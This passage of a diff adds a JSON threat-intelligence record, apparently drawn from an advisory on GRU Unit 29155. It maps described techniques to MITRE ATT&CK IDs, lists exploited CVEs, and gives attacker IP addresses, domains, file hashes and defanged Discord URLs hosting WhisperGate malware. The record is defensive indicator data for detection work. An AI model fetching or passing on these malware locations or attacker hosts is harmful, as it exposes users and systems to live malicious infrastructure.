+   "name": "Command and Scripting Interpreter: PowerShell",
+   "evidence": "https://ngrok[.]com"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Command and Scripting Interpreter: Python",
+   "evidence": "interlinks[.]top"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Command and Scripting Interpreter: Bash",
+   "evidence": "interlinks[.]top"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Command and Scripting Interpreter: PowerShell",
+   "evidence": "interlinks[.]top"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Data Destruction",
+   "mitre_id": "T1485",
+   "evidence": "leakage of sensitive information, and systematic sabotage caused by the destruction of data [T1485]."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Active Scanning: Scanning IP Blocks",
+   "mitre_id": "T1595.001",
+   "evidence": "Unit 29155 cyber actors have been observed targeting IP ranges [T1595.001] used within multiple"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Active Scanning",
+   "mitre_id": "T1595",
+   "evidence": "actors have used for scanning [T1595] and vulnerability exploit efforts. Unit 29155 cyber actors were not"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Active Scanning: Vulnerability Scanning",
+   "mitre_id": "T1595.002",
+   "evidence": "services, and vulnerabilities for networks [T1595.002].[6]"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Gather Victim Network Information: DNS",
+   "mitre_id": "T1590.002",
+   "evidence": "target websites [T1590.002].[7]"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Network Service Discovery",
+   "mitre_id": "T1046",
+   "evidence": "other machines [T1046]."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Search Open Technical Databases: Scan Databases",
+   "mitre_id": "T1596.005",
+   "evidence": "or device types [T1596.005].[12]"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Protocol Tunneling",
+   "mitre_id": "T1572",
+   "evidence": "[T1572] over port 1194, and in some instances, to perform Active Directory (AD) enumeration. Adminer in"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Obtain Capabilities: Exploits",
+   "mitre_id": "T1588.005",
+   "evidence": "victim infrastructure [T1588.005]. Unit 29155 cyber actors have been observed obtaining the respective"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exploit Public-Facing Application",
+   "mitre_id": "T1190",
+   "evidence": "Analysis concluded Unit 29155 cyber actors have exploited the following CVEs for initial access [T1190], as"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Obtain Capabilities: Malware",
+   "mitre_id": "T1588.001",
+   "evidence": "[T1588.001] like Raspberry Robin and SaintBot. While Unit 29155 cyber actors are best known for their"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Valid Accounts: Default Accounts",
+   "mitre_id": "T1078.001",
+   "evidence": "scripts to authenticate to IP cameras with default usernames and passwords [T1078.001], and exfiltrating"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Video Capture",
+   "mitre_id": "T1125",
+   "evidence": "images [T1125] (JPG files). Attempts are then made to perform remote command execution via web to"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Unsecured Credentials: Credentials In Files",
+   "mitre_id": "T1552.001",
+   "evidence": "plaintext (as shown in Table 1 below) [T1552.001]."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "OS Credential Dumping",
+   "mitre_id": "T1003",
+   "evidence": "[T1003]:"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Application Layer Protocol: Web Protocols",
+   "mitre_id": "T1071.001",
+   "evidence": "[T1071.001]"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage",
+   "mitre_id": "T1567.002",
+   "evidence": "exfiltrated data to mega[.]nz using Rclone [T1567.002]."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Use Alternate Authentication Material: Pass the Hash",
+   "mitre_id": "T1550.002",
+   "evidence": " Unit 29155 cyber actors used a Pass-the-Hash [T1550.002] via ProxyChains."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Brute Force: Password Spraying",
+   "mitre_id": "T1110.003",
+   "evidence": "spraying to obtain valid usernames and passwords [T1110.003]."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Acquire Infrastructure: Virtual Private Server",
+   "mitre_id": "T1583.003",
+   "evidence": "Since at least 2020, Unit 29155 cyber actors have used virtual private servers (VPSs) [T1583.003] to host"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Ingress Tool Transfer",
+   "mitre_id": "T1105",
+   "evidence": "payload [T1105], which commonly uses a reverse Transmission Control Protocol (TCP) connection to"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Non-Application Layer Protocol",
+   "mitre_id": "T1095",
+   "evidence": "initiate communication with the threat actors’ infrastructure [T1095]. In one instance, an established"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Server Software Component: Web Shell",
+   "mitre_id": "T1505.003",
+   "evidence": " Use of PHP (exp_door v1.0.2, b374k, WSO 4.0.5) and the P.A.S. web shells [T1505.003], likely"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Application Layer Protocol: DNS",
+   "mitre_id": "T1071.004",
+   "evidence": "network traffic [T1071.004]. For example, Iodine was used to tunnel data via"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Proxy: Multi-hop Proxy",
+   "mitre_id": "T1090.003",
+   "evidence": "[T1090.003]—has been used to provide further anonymity and modify system configuration to force"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Archive Collected Data",
+   "mitre_id": "T1560",
+   "evidence": "In several instances, analysis identified Unit 29155 cyber actors compressing victim data [T1560] (e.g., the"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "OS Credential Dumping: LSASS Memory",
+   "mitre_id": "T1003.001",
+   "evidence": "Subsystem Service (LSASS) memory dumps [T1003.001], Security Accounts Manager (SAM) files"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "OS Credential Dumping: Security Account Manager",
+   "mitre_id": "T1003.002",
+   "evidence": "[T1003.002], and SECURITY and SYSTEM event log files [T1654]. As seen in victim incident response"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Log Enumeration",
+   "mitre_id": "T1654",
+   "evidence": "[T1003.002], and SECURITY and SYSTEM event log files [T1654]. As seen in victim incident response"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Email Collection",
+   "mitre_id": "T1114",
+   "evidence": "results, actor infrastructure has also been used to compromise multiple mail servers [T1114] and exfiltrate"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Command and Scripting Interpreter: PowerShell",
+   "mitre_id": "T1059.001",
+   "evidence": "mail artifacts, such as email messages, using PowerShell [T1059.001] via the following command:"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Data from Information Repositories: Confluence",
+   "mitre_id": "T1213.001",
+   "evidence": "T1213.001 Unit 29155 cyber actors leveraged Through the Wire against the victim’s"
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2020-1472",
+   "evidence": " CVE-2020-1472 (Microsoft: Windows Server)"
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2021-26084",
+   "evidence": " CVE-2021-26084 (Atlassian Confluence Server and Data Center)"
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2021-3156",
+   "evidence": " CVE-2021-3156 (Red Hat: Privilege Escalation via Command Line Argument Parsing)"
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2021-4034",
+   "evidence": " CVE-2021-4034 (Red Hat: Polkit Privilege Escalation)"
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2022-27666",
+   "evidence": " CVE-2022-27666 (Red Hat: Heap Buffer Overflow Flaw)"
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2021-33044",
+   "evidence": " CVE-2021-33044 (Dahua Security)"
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2021-33045",
+   "evidence": " CVE-2021-33045 (Dahua Security)"
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2022-26134",
+   "evidence": " CVE-2022-26134 (Atlassian Confluence Server and Data Center)"
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2022-26138",
+   "evidence": " CVE-2022-26138 (Atlassian Confluence Server and Data Center)"
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2022-3236",
+   "evidence": " CVE-2022-3236 (Sophos: Firewall)"
+  }
+ ],
+ "observables": [
+  {
+   "type": "url",
+   "value": "mega.nz",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "domain-name",
+   "value": "mega.nz",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.175.38",
+   "indicates": [
+    "attack-pattern"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "81.17.24.130",
+   "indicates": [
+    "attack-pattern"
+   ]
+  },
+  {
+   "type": "domain-name",
+   "value": "mega.nz",
+   "indicates": [
+    "WhisperGate"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "896e0f54fc67d72d94b40d7885f10c51",
+   "hash": "MD5",
+   "indicates": [
+    "GO Simple Tunnel (GOST)"
+   ]
+  },
+  {
+   "type": "url",
+   "value": "hxxps://cdn.discordapp.com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg",
+   "indicates": [
+    "WhisperGate"
+   ]
+  },
+  {
+   "type": "url",
+   "value": "hxxps://cdn.discordapp.com/attachments/888408190625128461/895633952247799858/n.lashevychdirekcy.atom.gov.ua.zip",
+   "indicates": [
+    "WhisperGate"
+   ]
+  },
+  {
+   "type": "url",
+   "value": "3237.site",
+   "indicates": [
+    "WhisperGate"
+   ]
+  },
+  {
+   "type": "url",
+   "value": "smm2021.net",
+   "indicates": [
+    "WhisperGate"
+   ]
+  },
+  {
+   "type": "url",
+   "value": "hxxps://cdn.discordapp.com/attachments/945968593030496269/945970446149509130/Client.exe",
+   "indicates": [
+    "Client.exe"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92",
+   "hash": "SHA-256",
+   "indicates": [
+    "stage1.exe"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "5d5c99a08a7d927346ca2dafa7973fc1",
+   "hash": "MD5",
+   "indicates": [
+    "stage1.exe"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "MD5 5d5c99a08a7d927346ca2dafa7973fc1",
+   "hash": "MD5",
+   "indicates": [
+    "stage1.exe"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "SHA-256 a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92",
+   "hash": "SHA-256",
+   "indicates": [
+    "stage1.exe"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92",
+   "hash": "SHA-256",
+   "indicates": [
+    "stage1.exe"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "b9e64b58d7746cb1d3bed20405ef34d097af08c809d8dad10b9296b0bebb2b0b",
+   "hash": "SHA-256",
+   "indicates": [
+    "asd.exe"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "aa79afbf82b06cda268664b7c83900d8f7a33e0f0071facba0b3d8f7a68ce56a",
+   "hash": "SHA-256",
+   "indicates": [
+    "stage2.exe"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "eac0ae655d344c25ff467a929790885c",
+   "hash": "MD5",
+   "indicates": [
+    "asd.exe"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "764f691b2168e8b3b6f9fb6582e2f819",
+   "hash": "MD5",
+   "indicates": [
+    "stage2.exe"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "14c8482f302b5e81e3fa1b18a509289d",
+   "hash": "MD5",
+   "indicates": [
+    "stage2.exe"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78",
+   "hash": "SHA-256",
+   "indicates": [
+    "stage2.exe"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "b3370eb3c5ef6c536195b3bea0120929",
+   "hash": "MD5",
+   "indicates": [
+    "Tbopbh.jpg"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "923eb77b3c9e11d6c56052318c119c1a22d11ab71675e6b95d05eeb73d1accd6",
+   "hash": "SHA-256",
+   "indicates": [
+    "Tbopbh.jpg"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "e61518ae9454a563b8f842286bbdb87b",
+   "hash": "MD5",
+   "indicates": [
+    "Frkmlkdkdubkznbkmcf.dll"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "9ef7dbd3da51332a78eff19146d21c82957821e464e8133e9594a07d716d892d",
+   "hash": "SHA-256",
+   "indicates": [
+    "Frkmlkdkdubkznbkmcf.dll"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "17fc12902f4769af3a9271eb4e2dacce",
+   "hash": "MD5",
+   "indicates": [
+    "AdvancedRun.exe"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "29ae7b30ed8394c509c561f6117ea671ec412da50d435099756bbb257fafb10b",
+   "hash": "SHA-256",
+   "indicates": [
+    "AdvancedRun.exe"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "3907c7fbd4148395284d8e6e3c1dba5d",
+   "hash": "MD5",
+   "indicates": [
+    "Waqybg"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "34ca75a8c190f20b8a7596afeb255f2228cb2467bd210b2637965b61ac7ea907",
+   "hash": "SHA-256",
+   "indicates": [
+    "Waqybg"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "d034fe4c71b16b6d331886c24fef2751",
+   "hash": "MD5",
+   "indicates": [
+    "stage2.exe"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "4074798a621232dc448b65db7b1fdd66",
+   "hash": "MD5",
+   "indicates": [
+    "stage2.exe"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "422437f326b8dbe30cc5f103bde31f26",
+   "hash": "MD5",
+   "indicates": [
+    "Avbbwys.dll"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "7f84263fd24f783ff72d5ae91011b558",
+   "hash": "MD5",
+   "indicates": [
+    "Avbbwys.dll"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "d034fe4c71b16b6d331886c24fef2751",
+   "hash": "MD5",
+   "indicates": [
+    "Frkmlkdkdubkznbkmcf.dll"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "4074798a621232dc448b65db7b1fdd66",
+   "hash": "MD5",
+   "indicates": [
+    "Frkmlkdkdubkznbkmcf.dll"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "5.226.139.66",
+   "indicates": [
+    "GRU Unit 29155",
+    "WhisperGate",
+    "SaintBot",
+    "stage1.exe",
+    "stage2.exe",
+    "asd.exe",
+    "Tbopbh.jpg",
+    "Frkmlkdkdubkznbkmcf.dll",
+    "Nmddfrqqrbyjeygggda.vbs",
+    "AdvancedRun",
+    "Waqybg",
+    "WhisperKill"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "45.141.87.11",
+   "indicates": [
+    "GRU Unit 29155",
+    "WhisperGate",
+    "SaintBot",
+    "stage1.exe",
+    "stage2.exe",
+    "asd.exe",
+    "Tbopbh.jpg",
+    "Frkmlkdkdubkznbkmcf.dll",
+    "Nmddfrqqrbyjeygggda.vbs",
+    "AdvancedRun",
+    "Waqybg",
+    "WhisperKill"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "46.101.242.222",
+   "indicates": [
+    "GRU Unit 29155",
+    "WhisperGate",
+    "SaintBot",
+    "stage1.exe",
+    "stage2.exe",
+    "asd.exe",
+    "Tbopbh.jpg",
+    "Frkmlkdkdubkznbkmcf.dll",
+    "Nmddfrqqrbyjeygggda.vbs",
+    "AdvancedRun",
+    "Waqybg",
+    "WhisperKill"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "62.173.140.223",
+   "indicates": [
+    "GRU Unit 29155",
+    "WhisperGate",
+    "SaintBot",
+    "stage1.exe",
+    "stage2.exe",
+    "asd.exe",
+    "Tbopbh.jpg",
+    "Frkmlkdkdubkznbkmcf.dll",
+    "Nmddfrqqrbyjeygggda.vbs",
+    "AdvancedRun",
+    "Waqybg",
+    "WhisperKill"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "79.124.8.66",
+   "indicates": [
+    "GRU Unit 29155",
+    "WhisperGate",
+    "SaintBot",
+    "stage1.exe",
+    "stage2.exe",
+    "asd.exe",
+    "Tbopbh.jpg",
+    "Frkmlkdkdubkznbkmcf.dll",
+    "Nmddfrqqrbyjeygggda.vbs",
+    "AdvancedRun",
+    "Waqybg",
+    "WhisperKill"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "90.131.156.107",
+   "indicates": [
+    "GRU Unit 29155",
+    "WhisperGate",
+    "SaintBot",
+    "stage1.exe",
+    "stage2.exe",
+    "asd.exe",
+    "Tbopbh.jpg",
+    "Frkmlkdkdubkznbkmcf.dll",
+    "Nmddfrqqrbyjeygggda.vbs",
+    "AdvancedRun",
+    "Waqybg",
+    "WhisperKill"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "112.51.253.153",
+   "indicates": [
+    "GRU Unit 29155",
+    "WhisperGate",
+    "SaintBot",
+    "stage1.exe",
+    "stage2.exe",
+    "asd.exe",
+    "Tbopbh.jpg",
+    "Frkmlkdkdubkznbkmcf.dll",
+    "Nmddfrqqrbyjeygggda.vbs",
+    "AdvancedRun",
+    "Waqybg",
+    "WhisperKill"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "112.132.218.45",
+   "indicates": [
+    "GRU Unit 29155",
+    "WhisperGate",
+    "SaintBot",
+    "stage1.exe",
+    "stage2.exe",
+    "asd.exe",
+    "Tbopbh.jpg",
+    "Frkmlkdkdubkznbkmcf.dll",
+    "Nmddfrqqrbyjeygggda.vbs",
+    "AdvancedRun",
+    "Waqybg",
+    "WhisperKill"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "154.21.20.82",
+   "indicates": [
+    "GRU Unit 29155",
+    "WhisperGate",
+    "SaintBot",
+    "stage1.exe",
+    "stage2.exe",
+    "asd.exe",
+    "Tbopbh.jpg",
+    "Frkmlkdkdubkznbkmcf.dll",
+    "Nmddfrqqrbyjeygggda.vbs",
+    "AdvancedRun",
+    "Waqybg",
+    "WhisperKill"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.133.202",
+   "indicates": [
+    "GRU Unit 29155",
+    "WhisperGate",
+    "SaintBot",
+    "stage1.exe",
+    "stage2.exe",
+    "asd.exe",
+    "Tbopbh.jpg",
+    "Frkmlkdkdubkznbkmcf.dll",
+    "Nmddfrqqrbyjeygggda.vbs",
+    "AdvancedRun",
+    "Waqybg",
+    "WhisperKill"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.142.42",
+   "indicates": [
+    "GRU Unit 29155",
+    "WhisperGate",
+    "SaintBot",
+    "stage1.exe",
+    "stage2.exe",
+    "asd.exe",
+    "Tbopbh.jpg",
+    "Frkmlkdkdubkznbkmcf.dll",
+    "Nmddfrqqrbyjeygggda.vbs",
+    "AdvancedRun",
+    "Waqybg",
+    "WhisperKill"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.162.55",
+   "indicates": [
+    "GRU Unit 29155",
+    "WhisperGate",
+    "SaintBot",
+    "stage1.exe",
+    "stage2.exe",
+    "asd.exe",
+    "Tbopbh.jpg",
+    "Frkmlkdkdubkznbkmcf.dll",
+    "Nmddfrqqrbyjeygggda.vbs",
+    "AdvancedRun",
+    "Waqybg",
+    "WhisperKill"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.175.38",
+   "indicates": [
+    "GRU Unit 29155",
+    "WhisperGate",
+    "SaintBot",
+    "stage1.exe",
+    "stage2.exe",
+    "asd.exe",
+    "Tbopbh.jpg",
+    "Frkmlkdkdubkznbkmcf.dll",
+    "Nmddfrqqrbyjeygggda.vbs",
+    "AdvancedRun",
+    "Waqybg",
+    "WhisperKill"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.175.108",
+   "indicates": [
+    "GRU Unit 29155",
+    "WhisperGate",
+    "SaintBot",
+    "stage1.exe",
+    "stage2.exe",
+    "asd.exe",
+    "Tbopbh.jpg",
+    "Frkmlkdkdubkznbkmcf.dll",
+    "Nmddfrqqrbyjeygggda.vbs",
+    "AdvancedRun",
+    "Waqybg",
+    "WhisperKill"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.176.60",
+   "indicates": [
+    "GRU Unit 29155",
+    "WhisperGate",
+    "SaintBot",
+    "stage1.exe",
+    "stage2.exe",
+    "asd.exe",
+    "Tbopbh.jpg",
+    "Frkmlkdkdubkznbkmcf.dll",
+    "Nmddfrqqrbyjeygggda.vbs",
+    "AdvancedRun",
+    "Waqybg",
+    "WhisperKill"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.187.47",
+   "indicates": [
+    "GRU Unit 29155",
+    "WhisperGate",
+    "SaintBot",
+    "stage1.exe",
+    "stage2.exe",
+    "asd.exe",
+    "Tbopbh.jpg",
+    "Frkmlkdkdubkznbkmcf.dll",
+    "Nmddfrqqrbyjeygggda.vbs",
+    "AdvancedRun",
+    "Waqybg",
+    "WhisperKill"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.189.218",
+   "indicates": [
+    "GRU Unit 29155",
+    "WhisperGate",
+    "SaintBot",
+    "stage1.exe",
+    "stage2.exe",
+    "asd.exe",
+    "Tbopbh.jpg",
+    "Frkmlkdkdubkznbkmcf.dll",
+    "Nmddfrqqrbyjeygggda.vbs",
+    "AdvancedRun",
+    "Waqybg",
+    "WhisperKill"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "185.245.84.227",
+   "indicates": [
+    "GRU Unit 29155",
+    "WhisperGate",
+    "SaintBot",
+    "stage1.exe",
+    "stage2.exe",
+    "asd.exe",
+    "Tbopbh.jpg",
+    "Frkmlkdkdubkznbkmcf.dll",
+    "Nmddfrqqrbyjeygggda.vbs",
+    "AdvancedRun",
+    "Waqybg",
+    "WhisperKill"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "185.245.85.251",
+   "indicates": [
+    "GRU Unit 29155",
+    "WhisperGate",
+    "SaintBot",
+    "stage1.exe",
+    "stage2.exe",
+    "asd.exe",
+    "Tbopbh.jpg",
+    "Frkmlkdkdubkznbkmcf.dll",
+    "Nmddfrqqrbyjeygggda.vbs",
+    "AdvancedRun",
+    "Waqybg",
+    "WhisperKill"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "5.226.139.66",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "45.141.87.11",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "46.101.242.222",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "62.173.140.223",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "79.124.8.66",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "90.131.156.107",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "112.51.253.153",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "112.132.218.45",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "154.21.20.82",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.133.202",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.142.42",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.162.55",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.175.38",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.175.108",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.176.60",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.187.47",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.189.218",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "185.245.84.227",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "185.245.85.251",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "194.26.29.84",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "194.26.29.95",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "194.26.29.98",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "194.26.29.251",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "domain-name",
+   "value": "interlinks.top",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "domain-name",
+   "value": "3proxy.ru",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "domain-name",
+   "value": "ngrok.com",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "domain-name",
+   "value": "nssm.cc",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "896e0f54fc67d72d94b40d7885f10c51",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "5d5c99a08a7d927346ca2dafa7973fc1",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "8bedc411012a33ba34f49130d0f186993c6a32dad8976f6a5d82c1ed23054c05",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "eac0ae655d344c25ff467a929790885c",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "b9e64b58d7746cb1d3bed20405ef34d097af08c809d8dad10b9296b0bebb2b0b",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "764f691b2168e8b3b6f9fb6582e2f819",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "aa79afbf82b06cda268664b7c83900d8f7a33e0f0071facba0b3d8f7a68ce56a",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "14c8482f302b5e81e3fa1b18a509289d",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "b3370eb3c5ef6c536195b3bea0120929",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "923eb77b3c9e11d6c56052318c119c1a22d11ab71675e6b95d05eeb73d1accd6",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "e61518ae9454a563b8f842286bbdb87b",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "9ef7dbd3da51332a78eff19146d21c82957821e464e8133e9594a07d716d892d",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "7c8cb5598e724d34384cce7402b11f0e",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "78c855a088924e92a7f60d661c3d1845",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "6eed4ee0cc57126e9a096ab9905f471c",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "db5a204a34969f60fe4a653f51d64eee024dbf018edea334e8b3df780eda846f",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "5a537673c34933fc854fbfb65477a686",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "35feefe6bd2b982cb1a5d4c1d094e8665c51752d0a6f7e3cae546d770c280f3a",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "de85ca91e1e8100a619de1c25112f1a5",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "489ab4819830d231c3fc3572c5386cad9d18773a8121373ea8174de981cc9166",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "9b1191f1ceddf312b0d609cd929c6631",
